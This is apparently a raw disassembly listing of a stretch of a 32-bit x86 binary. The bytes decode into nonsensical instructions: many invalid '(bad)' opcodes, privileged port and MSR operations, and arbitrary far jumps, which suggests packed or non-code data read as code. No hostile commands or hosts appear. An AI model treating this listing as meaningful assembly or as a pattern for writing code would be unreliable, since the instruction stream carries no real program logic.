  42110e:	scas   eax,DWORD PTR es:[edi]
  42110f:	cwde   
  421110:	test   edi,0x12667450
  421116:	adc    eax,edi
  421118:	repz aaa 
  42111a:	cs xchg ebp,eax
  42111c:	call   0x31e997
  421121:	adc    DWORD PTR [ebp-0x62341210],eax
  421127:	loop   0x42119e
  421129:	pop    edx
  42112a:	mov    edi,0x7e5c7ebd
  42112f:	jmp    0xa936:0x3e45c167
  421136:	pop    ds
  421137:	bound  eax,QWORD PTR [ebx-0x51]
  42113a:	imul   ebp,DWORD PTR [eax],0xffffff83
  42113d:	shr    esi,cl
  42113f:	adc    DWORD PTR [ecx-0x3b73c7d9],esi
  421145:	inc    ebp
  421146:	adc    eax,0x785af54d
  42114b:	cli    
  42114c:	mov    DWORD PTR [edx],esp
  42114e:	sub    BYTE PTR [ecx],bh
  421150:	popf   
  421151:	(bad)  
  421152:	dec    esi
  421153:	sub    BYTE PTR [edi+0x43],dl
  421156:	add    al,0x63
  421158:	dec    ecx
  421159:	xchg   ebx,eax
  42115a:	wrmsr  
  42115c:	mov    ch,0x86
  42115e:	in     eax,0x8
  421160:	jae    0x421150
  421162:	fist   WORD PTR [edi]
  421164:	jo     0x421190
  421166:	shl    esi,cl
  421168:	cmp    eax,0xbafd17a1
  42116d:	mov    BYTE PTR [ebp-0x64eb8331],dl
  421173:	ret    
  421174:	jb     0x4211ed
  421176:	out    dx,al
  421177:	pop    ss
  421178:	pop    eax
  421179:	leave  
  42117a:	jo     0x4211f1
  42117c:	mov    cl,0xab
  42117e:	std    
  42117f:	push   ebx
  421180:	dec    edx
  421181:	repz xor WORD PTR [ecx+esi*4],0x8d50
  421188:	adc    DWORD PTR [ecx-0x22],0xc20f9685
  42118f:	cmp    DWORD PTR [ebx],ebp
  421191:	call   0x29e38d4d
  421196:	push   edx
  421197:	repnz gs (bad) 
  42119b:	(bad)  
  42119d:	sbb    eax,DWORD PTR [edi-0xf]
  4211a0:	xor    al,ah
  4211a2:	inc    eax
  4211a3:	gs add al,0xe
  4211a6:	shr    ebp,1
  4211a8:	or     BYTE PTR [ebx-0x6d],0x7e
  4211ac:	es lahf 
  4211ae:	repnz fbstp TBYTE PTR [ebx-0x36]
  4211b2:	fisub  DWORD PTR [ecx-0x40]
  4211b5:	or     eax,0x3e1b03eb
  4211ba:	xchg   edx,eax
  4211bb:	or     ecx,DWORD PTR [edx+0x1da1ca15]
  4211c1:	shr    BYTE PTR [edi-0x358a2124],1
  4211c7:	aam    0x9e
  4211c9:	add    eax,DWORD PTR [edi+0x41]
  4211cc:	fs mov bh,0x2f
  4211cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211d0:	lods   al,BYTE PTR ds:[esi]
  4211d1:	mov    eax,ds:0x869f11d4
  4211d6:	xor    cl,BYTE PTR [eax-0x74d6344f]
  4211dc:	in     al,dx
  4211dd:	jecxz  0x4211a7
  4211df:	or     al,0x4a
  4211e1:	cmp    DWORD PTR [eax-0x19],0x84c6100
  4211e8:	out    0xaa,al
  4211ea:	sbb    ch,BYTE PTR [edi]
  4211ec:	ret    
  4211ed:	pop    es
  4211ee:	cmp    BYTE PTR [edx+0x1a6f4ddf],dh
  4211f4:	stc    
  4211f5:	xor    BYTE PTR [edx-0x3748408d],bl
  4211fb:	(bad)  [ecx+0x65c0612d]
  421201:	(bad)  
  421202:	mov    edx,0x25257784
  421207:	sub    ecx,0xffffffcc
  42120a:	lods   al,BYTE PTR ds:[esi]
  42120b:	jmp    0xf30bf3e6
  421210:	dec    esp
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x36b47ab3
  421282:	mov    edx,DWORD PTR [edx-0x63]
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0x12000001
  42128d:	inc    ebx
  42128e:	out    dx,eax
  42128f:	outs   dx,DWORD PTR ds:[esi]
  421290:	lahf   
  421291:	fabs   
  421293:	jns    0x4212da
  421295:	adc    BYTE PTR [esp+ebp*1],bl
  421298:	bound  esi,QWORD PTR [esi-0x6ed6625a]
  42129e:	lods   eax,DWORD PTR ds:[esi]
  42129f:	pop    esi
  4212a0:	shr    BYTE PTR [esi],0x36
  4212a3:	xchg   esi,eax
  4212a4:	loop   0x421292
  4212a6:	jp     0x421282
  4212a8:	xor    cl,BYTE PTR [edi-0x6a]
  4212ab:	test   al,0x22
  4212ad:	in     eax,dx
  4212ae:	clc    
  4212af:	mov    cl,0xcf
  4212b1:	or     esp,DWORD PTR ds:0x9a4e861b
  4212b7:	ror    BYTE PTR [ecx],cl
  4212b9:	jge    0x421250
  4212bb:	jbe    0x42129b
  4212bd:	xchg   esp,eax
  4212be:	jno    0x421264
  4212c0:	cli    
  4212c1:	ret    
  4212c2:	out    dx,eax
  4212c3:	inc    BYTE PTR [ecx-0x475b4df7]
  4212c9:	push   ebx
  4212ca:	jnp    0x421265
  4212cc:	daa    
  4212cd:	inc    edx
  4212ce:	jb     0x421272
  4212d0:	xchg   esp,eax
  4212d1:	daa    
  4212d2:	pusha  
  4212d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212d4:	mov    edx,0xc9e3fb99
  4212d9:	retf   0x2929
  4212dc:	and    al,0xbf
  4212de:	in     eax,dx
  4212df:	inc    ebx
  4212e0:	dec    esi
  4212e1:	int    0x71
  4212e3:	mov    ah,0xdb
  4212e5:	das    
  4212e6:	pop    edi
  4212e7:	mov    ebp,0x4c04edcf
  4212ec:	jne    0x4212b8
  4212ee:	inc    eax
  4212ef:	adc    DWORD PTR ds:0x2a2e34ed,ecx
  4212f5:	sbb    BYTE PTR [ebx],ah
  4212f7:	stos   DWORD PTR es:[edi],eax
  4212f8:	or     bh,bh
  4212fa:	pop    ebp
  4212fb:	rcr    DWORD PTR [si-0x54],cl
  4212ff:	in     eax,0xb1
  421301:	sub    eax,edx
  421303:	inc    ebx
  421304:	or     ch,dl
  421306:	out    0x72,al
  421308:	xor    ebx,eax
  42130a:	jae    0x421303
  42130c:	leave  
  42130d:	inc    edi
  42130e:	cdq    
  42130f:	js     0x421291
  421311:	fisubr WORD PTR [ecx-0x4093cd0c]
  421317:	test   DWORD PTR [esi-0x3a],0x85427597
  42131e:	cmp    ecx,esp
  421320:	or     DWORD PTR [edx+ebp*2+0x7f],ebx
  421324:	cmp    al,0x9d
  421326:	jne    0x421394
  421328:	push   0x98e5d8d5
  42132d:	rol    BYTE PTR [ecx+0x78374f02],1
  421333:	fst    QWORD PTR [ebx]
  421335:	enter  0xe871,0x92
  421339:	cmp    al,0xe4
  42133b:	pop    ds
  42133c:	repz jae 0x42135e
  42133f:	loope  0x4212ef
  421341:	fbld   TBYTE PTR [ebx+0x6cd66233]
  421347:	call   0x8518b97a
  42134c:	out    dx,al
  42134d:	fucom  st(1)
  42134f:	in     al,0x9d
  421351:	lahf   
  421352:	fist   DWORD PTR [esi-0x381d62d9]
  421358:	jb     0x42134c
  42135a:	jae    0x421354
  42135c:	pop    esp
  42135d:	sbb    DWORD PTR [ebx+edi*1-0x7b],0xf864b8db
  421365:	scas   eax,DWORD PTR es:[edi]
  421366:	inc    eax
  421367:	jge    0x421376
  421369:	inc    eax
  42136a:	(bad)
  42136d:	test   BYTE PTR [ebx+0x58],cl
  421370:	sub    al,0x17
  421372:	loopne 0x42133b
  421374:	inc    esi
  421375:	retf   
  421376:	jnp    0x4212f9
  421378:	push   0xffffffc0
  42137a:	fcomi  st,st(2)
  42137c:	sbb    al,0x47
  42137e:	cmp    esp,DWORD PTR [eax]
  421380:	jb     0x421371
  421382:	(bad)  
  421383:	mov    ebp,0x7ece3c3d
  421388:	loop   0x421389
  42138a:	inc    ebx
  42138b:	fadd   QWORD PTR [eax+0x5a6473e7]
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x6fa8f49f]
  421402:	aad    0xa2
  421404:	mov    ds:0x5000162,al
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    BYTE PTR [ebp-0xb6b153a],cl
  421411:	jg     0x421474
  421413:	jmp    0x421489
  421415:	es aad 0xe1
  421418:	popf   
  421419:	cmp    esp,DWORD PTR [esi+0x36]
  42141c:	fs adc al,0xa4
  42141f:	stos   BYTE PTR es:[edi],al
  421420:	mov    edi,0x33592a43
  421425:	call   0x35dc:0x1a59f9a5
  42142c:	ret    0x94ae
  42142f:	ja     0x42140e
  421431:	cmp    esi,esi
  421433:	fild   WORD PTR [esi-0x1270c9dc]
  421439:	jbe    0x421447
  42143b:	mov    esp,edi
  42143d:	add    eax,0x741e0f2d
  421442:	mov    esi,0x22e63a7
  421447:	mov    ds:0xbe9c03b8,al
  42144c:	ret    0x6175
  42144f:	ret    
  421450:	xor    DWORD PTR [edi-0x5],esi
  421453:	mov    bh,0x4d
  421455:	mul    BYTE PTR [edi+edx*4+0x7a]
  421459:	das    
  42145a:	add    cl,dh
  42145c:	in     al,dx
  42145d:	ficomp WORD PTR [ebp-0x25]
  421460:	adc    al,0x90
  421462:	mov    BYTE PTR [ebx],ah
  421464:	xchg   ebp,eax
  421465:	add    edi,edi
  421467:	sahf   
  421468:	rcr    dl,cl
  42146a:	ss cld 
  42146c:	mov    ds:0x361d5506,eax
  421471:	hlt    
  421472:	icebp  
  421473:	jae    0x4214e1
  421475:	xor    edx,eax
  421477:	imul   esp,DWORD PTR [ebx],0xffffffe0
  42147a:	mov    bh,0xe2
  42147c:	jle    0x421459
  42147e:	jo     0x4214a5
  421480:	cmp    eax,0x700156ea
  421485:	fwait
  421486:	sbb    eax,0xde58f134
  42148b:	ss add eax,0xcb956bf8
  421491:	dec    edi
  421492:	xchg   edx,eax
  421493:	jo     0x421495
  421495:	fist   DWORD PTR [esi+0x5eb314b3]
  42149b:	pusha  
  42149c:	ficomp DWORD PTR [eax-0x6b]
  42149f:	retf   0x508b
  4214a2:	mov    cl,dl
  4214a4:	jle    0x421499
  4214a6:	or     ebp,DWORD PTR [edi]
  4214a8:	dec    esp
  4214a9:	mov    edi,0xcecfb9f4
  4214ae:	cmp    ah,BYTE PTR [eax]
  4214b0:	xchg   ebp,eax
  4214b1:	push   edx
  4214b2:	loope  0x4214aa
  4214b4:	adc    esi,DWORD PTR [edi+ebx*8+0x1]
  4214b8:	leave  
  4214b9:	and    dh,cl
  4214bb:	inc    esp
  4214bc:	sub    esi,DWORD PTR [ebx+esi*1]
  4214bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214c0:	ret    
  4214c1:	mul    DWORD PTR [ecx+0x1bc98e10]
  4214c7:	or     eax,0xa5ac9cfd
  4214cc:	mov    bl,0x41
  4214ce:	cld    
  4214cf:	sub    BYTE PTR [eax+0x2a],dh
  4214d2:	(bad)  
  4214d3:	cmp    esi,DWORD PTR [ebp+0x2dc96b48]
  4214d9:	mov    edx,0x5e612967
  4214de:	test   bh,ch
  4214e0:	sti    
  4214e1:	jb     0x4214a5
  4214e3:	outs   dx,DWORD PTR ds:[esi]
  4214e4:	scas   eax,DWORD PTR es:[edi]
  4214e5:	stos   BYTE PTR es:[edi],al
  4214e6:	(bad)  
  4214e7:	hlt    
  4214e8:	push   ds
  4214e9:	popa   
  4214ea:	dec    esi
  4214eb:	(bad)  
  4214ec:	jge    0x421538
  4214ee:	sub    ebp,ebp
  4214f0:	mov    al,ds:0x959c1075
  4214f5:	fcmovne st,st(7)
  4214f7:	sti    
  4214f8:	mov    ebx,0x1947e106
  4214fd:	ins    BYTE PTR es:[edi],dx
  4214fe:	lock arpl WORD PTR [eax+0x45],di
  421502:	jo     0x421531
  421504:	gs mov ebp,0xbbfdef2f
  42150a:	jle    0x42152f
  42150c:	xchg   esp,eax
  42150d:	add    cl,BYTE PTR [esi+0x1279]
	...
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x1f6342b4],bp
  421582:	add    BYTE PTR [ecx+0x163a7],bh
  421588:	add    eax,0x2000001
  42158d:	loopne 0x421555
  42158f:	out    dx,al
  421590:	outs   dx,BYTE PTR ds:[esi]
  421591:	cmp    al,0x6e
  421593:	imul   eax,DWORD PTR [ecx-0x50],0x42
  421597:	or     cl,BYTE PTR [eax+0x55]
  42159a:	inc    eax
  42159b:	(bad)  
  42159c:	cs es push ebp
  42159f:	test   al,0xe
  4215a2:	(bad)  [eax+0x3c]
  4215a5:	and    DWORD PTR [eax+eax*8-0x524f716d],esi
  4215ac:	test   eax,0x40f1cb4
  4215b1:	xor    DWORD PTR [eax+esi*8],esi
  4215b4:	loop   0x4215fa
  4215b6:	push   esi
  4215b7:	and    al,0xb3
  4215b9:	pop    es
  4215ba:	and    ah,BYTE PTR [edi+0x708cd72a]
  4215c0:	test   DWORD PTR [ebp+0x21],esp
  4215c3:	or     eax,0x66fcb5b1
  4215c8:	stc    
  4215c9:	inc    eax
  4215ca:	cmp    al,bh
  4215cc:	sub    DWORD PTR [edx+0x11],0xffffffad
  4215d0:	push   ecx
  4215d1:	retw   
  4215d3:	adc    BYTE PTR [eax-0x1db01bfe],dl
  4215d9:	dec    esp
  4215da:	add    al,0xb8
  4215dc:	or     dl,bl
  4215de:	pop    esi
  4215df:	adc    al,0x38
  4215e1:	inc    edx
  4215e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215e3:	push   ecx
  4215e4:	lods   al,BYTE PTR ds:[esi]
  4215e5:	stos   DWORD PTR es:[edi],eax
  4215e6:	das    
  4215e7:	lsl    eax,WORD PTR [edx-0x30]
  4215eb:	fld    DWORD PTR [edi+esi*1-0x2fe1b354]
  4215f2:	mov    edi,0x6b6c86f6
  4215f7:	push   esp
  4215f8:	adc    al,0x36
  4215fa:	xchg   ebx,eax
  4215fb:	cmp    eax,0xef333f23
  421600:	inc    edi
  421601:	sub    bl,cl
  421603:	inc    eax
  421604:	clc    
  421605:	push   edi
  421606:	lods   al,BYTE PTR ds:[esi]
  421607:	sub    eax,0x7ab5be3a
  42160c:	not    DWORD PTR [edi+0x6a9940d3]
  421612:	dec    eax
  421613:	jns    0x42162d
  421615:	leave  
  421616:	xchg   esi,eax
  421617:	imul   esp,DWORD PTR [eax-0x2a3f7547],0x69487a82
  421621:	adc    DWORD PTR [edi+0x1b],edi
  421624:	pop    esp
  421625:	mov    eax,ds:0xa1ce7d37
  42162a:	fstp   TBYTE PTR [eax]
  42162c:	mov    esp,0x5423be52
  421631:	stc    
  421632:	das    
  421633:	xor    al,0x9d
  421635:	pop    ss
  421636:	lea    ecx,ds:0x54eea78d
  42163c:	push   ebx
  42163d:	das    
  42163e:	sbb    eax,0x4ab0a31e
  421643:	jmp    0x6ed7343b
  421648:	jg     0x42166b
  42164a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42164b:	daa    
  42164c:	loope  0x4215ea
  42164e:	pop    es
  42164f:	push   0xe0314785
  421654:	cdq    
  421655:	pop    edi
  421656:	add    esi,esp
  421658:	or     al,0xb8
  42165a:	arpl   WORD PTR [ecx+eiz*1+0x5c7d7116],bx
  421661:	cmp    ebp,esp
  421663:	std    
  421664:	(bad)  
  421665:	mov    eax,ds:0x7f30dd4
  42166a:	test   al,0x88
  42166c:	mov    al,ds:0xc69c9df3
  421671:	mov    ds:0x7569c8a4,al
  421676:	pop    ds
  421677:	push   edx
  421678:	inc    ebx
  421679:	and    al,0x7c
  42167b:	jbe    0x421671
  42167d:	add    eax,0x664edda2
  421682:	pop    edi
  421683:	fwait
  421684:	ins    DWORD PTR es:[edi],dx
  421685:	sub    ebx,0xffffffd8
  421688:	sbb    DWORD PTR [eax],0x302042
  42168e:	xchg   esp,eax
  42168f:	inc    ebx
  421690:	jbe    0x421692
	...
  4216f2:	add    BYTE PTR [eax],al
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	repnz gs dec ebp
  421703:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0x26000001
  42170d:	outs   dx,DWORD PTR ds:[esi]
  42170e:	js     0x42173c
  421710:	rol    BYTE PTR [eax+0x7e],0xee
  421714:	mov    esi,0x259c79f6
  421719:	ret    0xdbda
  42171c:	cmp    al,0x6b
  42171e:	dec    esp
  42171f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421720:	dec    esi
  421721:	scas   eax,DWORD PTR es:[edi]
  421722:	pop    esi
  421723:	ds cmc 
  421725:	jecxz  0x421763
  421727:	lea    eax,[edx+0x2b]
  42172a:	xchg   DWORD PTR [eax],edx
  42172c:	jbe    0x4216be
  42172e:	xor    eax,0xbd6899f8
  421733:	xor    eax,0xcfb58473
  421738:	xchg   esp,eax
  421739:	dec    esp
  42173a:	jle    0x42173d
  42173c:	hlt    
  42173d:	mov    edi,0xc7830676
  421742:	cli    
  421743:	pop    ecx
  421744:	add    DWORD PTR [edi-0x49],ecx
  421747:	ins    DWORD PTR es:[edi],dx
  421748:	adc    esp,DWORD PTR [ebx-0x38]
  42174b:	mov    eax,ds:0x930151b5
  421750:	clc    
  421751:	pop    ebp
  421752:	push   esi
  421753:	ss (bad) 
  421755:	xor    eax,0xdf341c02
  42175a:	sti    
  42175b:	repz in eax,dx
  42175d:	mov    edi,0xffe6a32d
  421762:	inc    ecx
  421763:	dec    ebp
  421764:	dec    BYTE PTR [edx+0x5bbaed31]
  42176a:	mov    bl,0x6e
  42176c:	shl    BYTE PTR [edx],0x29
  42176f:	mov    al,ds:0xbd5b914c
  421774:	push   esi
  421775:	pop    ss
  421776:	xchg   BYTE PTR [esi+0x3e],dh
  421779:	addr16 push es
  42177b:	imul   eax,DWORD PTR [esi-0x5bb5e662],0x5ac7be58
  421785:	xor    BYTE PTR [edx+0x605790b2],ch
  42178b:	sahf   
  42178c:	inc    edi
  42178d:	ja     0x4217ff
  42178f:	pop    DWORD PTR [edx]
  421791:	aad    0xd8
  421793:	repz jmp 0xcea88a68
  421799:	mov    bh,bl
  42179b:	stos   DWORD PTR es:[edi],eax
  42179c:	xlat   BYTE PTR ds:[ebx]
  42179d:	arpl   WORD PTR [edx-0x57],bx
  4217a0:	xor    ah,BYTE PTR [ecx-0x330177ef]
  4217a6:	xor    bh,BYTE PTR [ecx+ebp*8+0x6f]
  4217aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217ab:	test   bl,0xe9
  4217ae:	mov    eax,fs
  4217b0:	(bad)  
  4217b1:	push   eax
  4217b2:	cld    
  4217b3:	sub    eax,0x3d7b35b4
  4217b8:	not    DWORD PTR [ebp+0xf807679]
  4217be:	mov    WORD PTR [esi-0x774ec965],cs
  4217c4:	ins    DWORD PTR es:[edi],dx
  4217c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217c6:	(bad)  
  4217c7:	adc    DWORD PTR [eax-0x283ceb02],0xffffff92
  4217ce:	das    
  4217cf:	sub    al,0x3f
  4217d1:	cmp    bh,BYTE PTR [eax-0x2d]
  4217d4:	jge    0x421762
  4217d6:	scas   al,BYTE PTR es:[edi]
  4217d7:	repnz ins BYTE PTR es:[edi],dx
  4217d9:	xchg   ecx,eax
  4217da:	fisubr DWORD PTR [edx+0x22]
  4217dd:	cmp    dl,BYTE PTR [ebx-0x1130c588]
  4217e3:	add    esp,DWORD PTR [edx-0x64]
  4217e6:	xor    DWORD PTR [ebp+0x6f8f5c60],edx
  4217ec:	cmp    esp,DWORD PTR [edx]
  4217ee:	pop    eax
  4217ef:	mov    eax,DWORD PTR [ecx+0x144f02e4]
  4217f5:	sbb    esi,DWORD PTR [eax]
  4217f7:	div    eax
  4217f9:	pop    ebp
  4217fa:	ins    BYTE PTR es:[edi],dx
  4217fb:	or     ecx,0x3
  4217fe:	adc    ah,BYTE PTR [edx+0x7f]
  421801:	ja     0x421847
  421803:	rep outs dx,DWORD PTR ds:[esi]
  421805:	fadd   QWORD PTR [eax+0x132121de]
  42180b:	jo     0x4217e0
  42180d:	push   edx
  42180e:	and    al,BYTE PTR [esi+0x76]
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	pusha  
  421881:	adc    al,0x8c
  421883:	or     DWORD PTR [ecx+0x5000165],esi
  421889:	add    DWORD PTR [eax],eax
  42188b:	add    BYTE PTR [ebp-0x10465b3d],al
  421891:	stos   BYTE PTR es:[edi],al
  421892:	mov    ebp,0xf2bb5a6d
  421897:	mov    dh,0x95
  421899:	pop    edi
  42189a:	mov    dh,bh
  42189c:	xchg   BYTE PTR [esi-0x11cd01c8],dl
  4218a2:	sub    dh,BYTE PTR [edx-0x55]
  4218a5:	js     0x4218ec
  4218a7:	cmp    eax,0xb74f1ace
  4218ac:	xor    BYTE PTR [edi+0x52],0xc7
  4218b0:	aaa    
  4218b1:	js     0x421913
  4218b3:	and    al,0x49
  4218b5:	jns    0x42189c
  4218b7:	(bad)  
  4218b9:	gs pusha 
  4218bb:	pop    ss
  4218bc:	clc    
  4218bd:	xchg   ecx,eax
  4218be:	stc    
  4218bf:	mov    esp,0xfda2e801
  4218c4:	(bad)  
  4218c5:	and    eax,DWORD PTR [ebx+0x2a]
  4218c8:	mov    DWORD PTR [ebp+0x6b66ab46],edi
  4218ce:	push   0x812f0b86
  4218d3:	adc    al,0x2d
  4218d5:	cs push esp
  4218d7:	push   ebx
  4218d8:	popa   
  4218d9:	enter  0x808,0x9f
  4218dd:	mov    ch,0x6
  4218df:	mov    bl,0x87
  4218e1:	shl    DWORD PTR [eax+ebx*8+0x7d],0x70
  4218e6:	pop    eax
  4218e7:	cmp    ebp,DWORD PTR [esi+eax*8+0x10cce5b9]
  4218ee:	xor    eax,0xf530587a
  4218f3:	xchg   ecx,eax
  4218f4:	xchg   edi,eax
  4218f5:	scas   eax,DWORD PTR es:[edi]
  4218f6:	int3   
  4218f7:	xchg   ecx,eax
  4218f8:	mov    eax,0x4067d8d2
  4218fd:	xor    dh,BYTE PTR [edx-0x63]
  421900:	jne    0x4218e0
  421902:	ficomp WORD PTR [ecx]
  421904:	mov    ch,0x4f
  421906:	pop    ds
  421907:	sub    DWORD PTR [ecx],ebx
  421909:	sub    DWORD PTR [esi+0x38],0x1bd729d2
  421910:	data16 shl BYTE PTR [edx-0x29],cl
  421914:	and    eax,0x778bb795
  421919:	(bad)  
  42191a:	mov    eax,DWORD PTR [ebp-0xe67c3a7]
  421920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421921:	ins    BYTE PTR es:[edi],dx
  421922:	sub    dh,0x24
  421925:	mov    ebp,0x4005aa9d
  42192a:	outs   dx,DWORD PTR ds:[esi]
  42192b:	fcomp  QWORD PTR [ecx-0x52]
  42192e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42192f:	imul   ebx,edx,0xffffff84
  421932:	retf   
  421933:	cmp    BYTE PTR [edx],0xb6
  421936:	xchg   edx,eax
  421937:	loopne 0x4218be
  421939:	add    ch,BYTE PTR [edx-0x37]
  42193c:	sbb    DWORD PTR [edi+0x32],ebx
  42193f:	mov    ah,0xe8
  421941:	ficomp DWORD PTR [ecx]
  421943:	sub    BYTE PTR [edx-0x6c289590],dh
  421949:	loopne 0x421932
  42194b:	xor    bl,BYTE PTR [esi-0x6df06cf8]
  421951:	fisubr DWORD PTR ds:0x4ddf8e3f
  421957:	daa    
  421958:	mov    al,ds:0xc79a13c7
  42195d:	dec    ebp
  42195e:	scas   eax,DWORD PTR es:[edi]
  42195f:	xor    DWORD PTR [edi+eiz*2-0x7a],edi
  421963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421964:	rcl    BYTE PTR [ecx],cl
  421966:	cmc    
  421967:	sub    bp,WORD PTR [edi-0x6b]
  42196b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42196c:	pop    ss
  42196d:	repnz mov al,0xf3
  421970:	sub    BYTE PTR [eax+edi*8+0x3b],dh
  421974:	mov    es,WORD PTR [edi-0x1691a993]
  42197a:	mov    eax,ds:0xe5e99300
  42197f:	dec    edx
  421980:	fs pop ebp
  421982:	je     0x4219b6
  421984:	xchg   ebp,eax
  421985:	mov    ebp,0x89a0165
  42198a:	or     al,0x94
  42198c:	and    al,0xc4
  42198e:	cmp    eax,0x5400
	...
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	imul   esi,ebx,0x66b63bfe
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    eax,0x22000001
  421a0d:	pop    ecx
  421a0e:	jl     0x421a09
  421a10:	sub    esi,ebp
  421a12:	push   cs
  421a13:	jno    0x421a94
  421a15:	jmp    0x65b1:0x7358f199
  421a1c:	imul   edi,DWORD PTR [eax+ebp*4-0x262ace8b],0xa0bd1c88
  421a27:	cmp    esi,DWORD PTR [ebx+0x16]
  421a2a:	sub    dh,BYTE PTR [edx+0x2c]
  421a2d:	stos   DWORD PTR es:[edi],eax
  421a2e:	inc    esp
  421a2f:	xor    eax,0x134a409b
  421a34:	add    DWORD PTR [edx+ebx*2+0x3b346081],esi
  421a3b:	dec    esi
  421a3c:	cmp    eax,0xfd87fd0e
  421a41:	sub    DWORD PTR [esi+0x64],edi
  421a44:	push   edi
  421a45:	cmp    BYTE PTR ds:0x413e3155,dl
  421a4b:	scas   eax,DWORD PTR es:[edi]
  421a4c:	jae    0x421aab
  421a4e:	xor    al,0xc0
  421a50:	ss push eax
  421a52:	mov    ebx,0x5951cb7
  421a57:	mov    ecx,0x1cda4b27
  421a5c:	adc    edx,ebp
  421a5e:	loop   0x421ad1
  421a60:	lods   al,BYTE PTR ds:[esi]
  421a61:	sbb    al,0xa4
  421a63:	cdq    
  421a64:	popa   
  421a65:	cmp    DWORD PTR [edi],0x39
  421a68:	sbb    edi,DWORD PTR [eax+0xf]
  421a6b:	ror    DWORD PTR [esi+0x4f],0x75
  421a6f:	jns    0x421a53
  421a71:	dec    esi
  421a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a73:	clc    
  421a74:	xchg   ebp,eax
  421a75:	mov    cl,0x6a
  421a77:	jno    0x421ae4
  421a79:	lods   eax,DWORD PTR ds:[esi]
  421a7a:	shl    esi,0xb4
  421a7d:	pop    ds
  421a7e:	mov    eax,0x31423607
  421a83:	je     0x421a4b
  421a85:	jno    0x421a90
  421a87:	fsubr  DWORD PTR [edi]
  421a89:	and    BYTE PTR [edi+0x11],0x58
  421a8d:	push   0xf
  421a8f:	dec    esi
  421a90:	adc    al,0x85
  421a92:	jg     0x421a74
  421a94:	xchg   ecx,eax
  421a95:	mov    ds:0xba84308,eax
  421a9a:	fcom   QWORD PTR [esi+0x66]
  421a9d:	out    0x62,al
  421a9f:	in     eax,0xfb
  421aa1:	arpl   WORD PTR [ecx],di
  421aa3:	pop    edi
  421aa4:	mov    eax,0xfc022d79
  421aa9:	jge    0x421aa9
  421aab:	int3   
  421aac:	and    eax,0x4ae77ee4
  421ab1:	retf   0x5bf5
  421ab4:	(bad)  
  421ab5:	mov    bl,0xa2
  421ab7:	loopne 0x421aa5
  421ab9:	retw   
  421abb:	mov    DWORD PTR [ebx-0x2aebd2ff],esi
  421ac1:	mov    cs,WORD PTR [edx+esi*2-0x6dd081b1]
  421ac8:	adc    ah,BYTE PTR [esi+0x27]
  421acb:	adc    BYTE PTR [edx+esi*8],dh
  421ace:	dec    ebp
  421acf:	(bad)
  421ad3:	ret    0x1834
  421ad6:	jg     0x421abc
  421ad8:	loopne 0x421adb
  421ada:	inc    ebp
  421adb:	and    eax,0x7df95061
  421ae0:	or     eax,0x1cc83924
  421ae5:	mov    WORD PTR [esi],ds
  421ae7:	sub    al,dh
  421ae9:	pop    eax
  421aea:	push   bp
  421aec:	stos   BYTE PTR es:[edi],al
  421aed:	add    eax,0x5b5da621
  421af2:	inc    esi
  421af3:	cmc    
  421af4:	jns    0x421b45
  421af6:	shr    DWORD PTR [edx+ecx*1-0x70],cl
  421afa:	pop    ecx
  421afb:	sub    al,0xca
  421afd:	js     0x421afc
  421aff:	add    BYTE PTR [edi-0x4923a1e8],ah
  421b05:	or     cl,ch
  421b07:	mov    eax,ds:0xd9fe7f79
  421b0c:	int    0xf2
  421b0e:	sbb    DWORD PTR [esi+0x4f],edx
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     ah,BYTE PTR [ecx-0x33]
  421b82:	pop    ebp
  421b83:	nop
  421b84:	mov    ebx,0x5000167
  421b89:	add    DWORD PTR [eax],eax
  421b8b:	add    BYTE PTR [esi],bh
  421b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b8e:	cmp    edx,DWORD PTR [edx-0x52]
  421b91:	and    eax,0xab2d196d
  421b96:	mov    ebp,0x31b415fb
  421b9b:	pop    edx
  421b9c:	and    BYTE PTR [ebp+eiz*4+0x2e],cl
  421ba0:	cwde   
  421ba1:	arpl   WORD PTR ds:0x3c4582ea,sp
  421ba7:	mov    ecx,DWORD PTR [edx+0xa60a132]
